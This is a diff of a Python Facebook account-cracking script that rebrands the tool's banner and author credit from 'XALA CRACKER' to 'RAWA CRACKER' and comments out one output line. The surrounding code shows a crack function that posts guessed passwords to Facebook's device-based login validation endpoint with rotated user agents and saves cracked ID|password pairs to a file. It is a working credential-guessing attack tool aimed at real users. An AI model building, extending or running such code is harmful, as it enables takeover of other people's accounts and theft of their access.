@@ -131,19 +131,17 @@ def back():
 def banner():
 	print(f'''\t{M} 
 
-8888888888     d8888  .d8888b. 88888888888 
-888           d88888 d88P  Y88b    888     
-888          d88P888 Y88b.         888     
-8888888     d88P 888  "Y888b.      888     
-888        d88P  888     "Y88b.    888     
-888       d88P   888       "888    888     
-888      d8888888888 Y88b  d88P    888     
-888     d88P     888  "Y8888P"     888     
+  ██████   █████  ██     ██  █████  
+██   ██ ██   ██ ██     ██ ██   ██ 
+██████  ███████ ██  █  ██ ███████ 
+██   ██ ██   ██ ██ ███ ██ ██   ██ 
+██   ██ ██   ██  ███ ███  ██   ██  
                                               
 
 ====================================             
- [✓] 𝔸𝕌𝕋ℍ𝕆ℝ   >ＸＡＬＡ ＣＲＡＣＫＥＲ
+ [✓] 𝔸𝕌𝕋ℍ𝕆ℝ   > R A W A C R A C K E R🔥
 ====================================
+                  VESION 1.5
 			''')
 #--------------------[ BAGIAN-MASUK ]--------------#
 def HAMA():
@@ -670,7 +668,7 @@ os.system('clear');banner()
 def crack(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r{Z}[1551-OK]{P} {Z}[{Z}{loop}{Z}/{Z}{len(id)}{Z}]—{Z}[{H}{ok}{Z}]—[{K}{cp}{Z}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{Z}]  "),
+	sys.stdout.write(f"\r{Z}[RAWA-OK]{P} {Z}[{Z}{loop}{Z}/{Z}{len(id)}{Z}]—{Z}[{H}{ok}{Z}]—[{K}{cp}{Z}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{Z}]  "),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -725,7 +723,7 @@ def crack(idf,pwv):
 }) 
 			po = ses.post('https://d.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				print(f'\r{x}AKUN CP \n{M}ID    : {K}{idf}\n{M}PASS  : {K}{pw}\n{B}UGENT    :  {P}{ua} {N}')     
+				#print(f'\r{x}AKUN CP \n{M}ID    : {K}{idf}\n{M}PASS  : {K}{pw}\n{B}UGENT    :  {P}{ua} {N}')     
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
